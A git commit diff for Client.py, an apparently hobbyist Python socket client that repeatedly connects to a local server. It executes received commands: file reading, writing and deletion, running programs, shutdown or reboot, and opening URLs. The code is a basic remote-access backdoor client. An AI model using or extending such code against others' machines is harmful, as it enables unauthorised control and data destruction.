82eea5d8c826ea6cccf0727ec421f94907841975
Ch. Theodorou <theodoroucharalabos@gmail.com>
2017-04-18 18:29:06 +0300

    Update Client.py

--- Client.py
+++ Client.py
@@ -2,36 +2,36 @@ import socket
 import os
 import subprocess
 import sys
-import time #using time module to retry connection every 1 minute.
+import time #Using time module to retry connection every 1 minute.
 
 def client():
 
-    #creating the socket passing the ip and port as parameters and trying to connect
+    #Creating the socket passing the ip and port as parameters and trying to connect
     host = "127.0.0.1"
     port = 5000
     mySocket = socket.socket()
     mySocket.connect((host,port))
 
-    #initialize the message so the while loop can be accessed
+    #Initialize the message so the while loop can be accessed
     receiving_message =""
-    #if the message is quit just do it quit..
+    #If the message is quit just do it quit..
     while receiving_message!= 'quit':
-        
+        #Receiving a message as byte stream and decode() it in string
         receiving_message = mySocket.recv(4096).decode()
-        print(receiving_message)
-        #working with files and folders using the os module
+        print(receiving_message) #just to see if the message went through as intended
+        #Working with files and folders using the os module
         if receiving_message =='getcwd':
             getCurrentWorkingDirectory(mySocket)
         elif receiving_message[0:5] =='chdir':
             changeDirectory(mySocket,receiving_message)
         elif receiving_message == "listdir":
             listOfFilesAndFolders(mySocket)
-        #you need to provide the whole path no made what is your current working directory
+        #You need to provide the whole path no made what is your current working directory
         elif receiving_message[0:10] == "removedirs":
             removeDirectories(mySocket,receiving_message)    
         elif receiving_message[0:6] =='remove':
             deleteFile(mySocket,receiving_message)
-            #making new directories note that the directory starts from your current working directory not from /home or C:
+        #Making new directories note that the directory starts from your current working directory not from /home or C:
         elif receiving_message[0:8] == 'makedirs':
             makeDirectories(mySocket,receiving_message)
         elif receiving_message[0:6] == 'create':
@@ -41,7 +41,7 @@ def client():
         elif receiving_message[0:4] == 'read':
             readFile(mySocket,receiving_message)
         elif receiving_message[0:5] == 'write':
-            writeFile(mySocket,receiving_message)
+            writeToFile(mySocket,receiving_message)
         elif receiving_message[0:8] == 'shutdown':
             shutdown(mySocket,receiving_message)
         elif receiving_message[0:7] == 'browser':
@@ -55,7 +55,7 @@ def client():
             sending_message = "Sorry i couldn't execute"
             mySocket.send(sending_message.encode())
             
-    #close the socket when the message is quit
+    #Close the socket when the message is quit
     mySocket.close()
 
 
@@ -103,7 +103,7 @@ def removeDirectories(mySocket,receiving_message):
         
 def createFile(mySocket,receiving_message):
     try:
-        file = os.open(receiving_message[7:],os.O_RDWR|os.O_CREAT)
+        file = os.open(receiving_message[7:],os.O_CREAT)
         os.close(file)
         sending_message = 'File created.'
     except:
@@ -120,30 +120,53 @@ def readFile(mySocket,receiving_message):
         sending_message = "Error something went wrong.".encode()
     finally:
         mySocket.send(sending_message)
-        
-def writeFile(mySocket,receiving_message):
+
+       
+def writeToFile(mySocket,filename):
+    #Build a text message until close is send
     try:
-        file = os.open(receiving_message[6:],os.O_RDWR)
-        sending_message = "File open, write you message.".encode()
+        sending_message = "Start your message.".encode()
         mySocket.send(sending_message)
-        receiving_message=mySocket.recv(4096)
-        os.write(file,receiving_message)
-        os.close(file)
-        mySocket.send("Message written succesfully.".encode())
+        receiving_message = mySocket.recv(4096).decode()
+        print(receiving_message)
+        text = receiving_message
+        while receiving_message!="close":
+            mySocket.send(text.encode())
+            receiving_message = mySocket.recv(4096).decode()
+            text += "\n"+ receiving_message
+    #Open the file write the message and close() at the end
+        else:
+            file = os.open(filename[6:],os.O_RDWR)
+            os.write(file,text.encode())
+            os.close(file)
+            mySocket.send("Message written succesfully.".encode())
+    
     except:
-        mySocket.send("Something went wrong sorry.".encode())
+        mySocket.send("Something went wrong.".encode())
+        os.close(file)
 
 
 def shutdown(mySocket,receiving_message):
     try:
-        if receiving_message[9:] == "-r":
-            os.system("shutdown -r")
-            sending_message = "The computer will restart in 1 min."
-        elif  receiving_message[9:] == "-s":
-            os.system("shutdown -s")
-            sending_message = "The computer will shutdown in 1 min."
+        
+        if sys.platform == "win32":
+            if receiving_message[9:] == "-r":
+                os.system("shutdown -r")
+                sending_message = "The computer will restart in 1 min."
+            elif  receiving_message[9:] == "-s":
+                os.system("shutdown -s")
+                sending_message = "The computer will shutdown in 1 min."
+            else:
+                sending_message = "Wrong option use -r or -s"
         else:
-            sending_message = "Wrong option use -r or -s"
+            if receiving_message[9:] == "-r":
+                os.system("reboot")
+                sending_message = "The computer will restart."
+            elif  receiving_message[9:] == "-s":
+                os.system("shutdown")
+                sending_message = "The computer will shutdown."
+            else:
+                sending_message = "Wrong option use -r or -s"
     except:
         sending_message = "Error something went wrong"
     mySocket.send(sending_message.encode())
@@ -153,16 +176,18 @@ def listOfFilesAndFolders(mySocket):
     mySocket.send((str(sending_message)).encode())
 
 
-
+#check if the os is windows or linux and execute accordingly
+#in linux you can run only python scripts while in windows you can run pretty much any program
 def executeFile(mySocket,receiving_message):
     try:
         if sys.platform == "win32":
             os.startfile(receiving_message[8:])
         else:
-            opener ="open" if sys.platform == "darwin" else "xdg-open"
-            subprocess.call([opener, filename])
-    except FileNotFoundError:
-        sending_message = 'Error file not found'
+            output = subprocess.call(["python", receiving_message[8:]])
+            if output == 0:
+                sending_message = "File execute successfully."
+            else:
+                sending_message = "Could not execute."
     except:
         sending_message = "Error something went wrong"
     finally:
@@ -172,8 +197,8 @@ def executeFile(mySocket,receiving_message):
 
     
 def openURL(mySocket,receiving_message):
-    # open given url in google chrome broswer using subprocess module
-    # first pass browser and then the url you wanna open
+    # open given url in google chrome broswer, using subprocess module
+    # first pass browser location and then the url you want to open
     p = subprocess.Popen(['C:\Program Files (x86)\Google\Chrome\Application\chrome.exe',receiving_message[9:] ])
     sending_message = "broswer opened"
     mySocket.send(sending_message.encode())
@@ -191,10 +216,11 @@ def killTheBrowser(mySocket):
 
 if __name__ == "__main__":
    while True:
-    try:
-        client()
-    except:
-        print("could not connect")
-        time.sleep(60) # sleep for 60 seconds before retrying to connect
+       try:
+            client()
+       except:
+            print("could not connect")
+            time.sleep(60) # sleep for 60 seconds before retrying to connect
 
 
+    
